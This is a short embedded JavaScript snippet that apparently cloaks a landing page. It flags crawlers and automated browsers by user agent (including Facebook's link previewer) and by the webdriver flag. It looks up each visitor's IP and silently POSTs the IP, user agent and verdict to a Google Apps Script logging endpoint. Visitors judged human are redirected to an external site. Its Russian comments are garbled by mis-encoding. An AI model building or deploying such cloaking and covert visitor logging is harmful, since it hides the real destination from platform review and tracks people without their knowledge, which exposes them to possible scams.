<script>
  async function detect() {
    const ua = navigator.userAgent || '';
    const webdriver = navigator.webdriver ? '1' : '0';

    const suspiciousUAs = [/bot/i, /crawl/i, /spider/i, /facebookexternalhit/i];
    const isUASuspicious = suspiciousUAs.some(rx => rx.test(ua));

    let ip = '_';
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const json = await res.json();
      ip = json.ip;
    } catch (e) {}

    const isBot = webdriver === '1' || isUASuspicious;

    // –í—ã–≤–æ–¥ –Ω–∞ —ç–∫—Ä–∞–Ω:
    document.body.innerHTML += `
      <p>IP: ${ip}</p>
      <p>WebDriver: ${webdriver}</p>
      <p>UserAgent: ${ua}</p>
      <p>isUASuspicious: ${isUASuspicious}</p>
      <p>–†–µ–∑—É–ª—å—Ç–∞—Ç: ${isBot ? 'BOT üö´' : 'OK ‚úÖ'}</p>
    `;

    // –õ–æ–≥ –≤ —Ç–∞–±–ª–∏—Ü—É
    fetch('https://script.google.com/macros/s/AKfycbxTdOYf8RqR0Nn11OnsdnCpcryYBAPQiTkPnLwSjwg0QayMiVWOJiJ84OCkk2kViovhlQ/exec', {
      method: 'POST',
      body: JSON.stringify({
        ip,
        ua,
        webdriver,
        result: isBot ? 'bot' : 'ok'
      })
    });

    // –†–µ–¥–∏—Ä–µ–∫—Ç
    if (!isBot) {
      setTimeout(() => {
        window.location.href = 'http://argentinaforreal.tilda.ws/';
      }, 1000);
    }
  }

  detect();
</script>
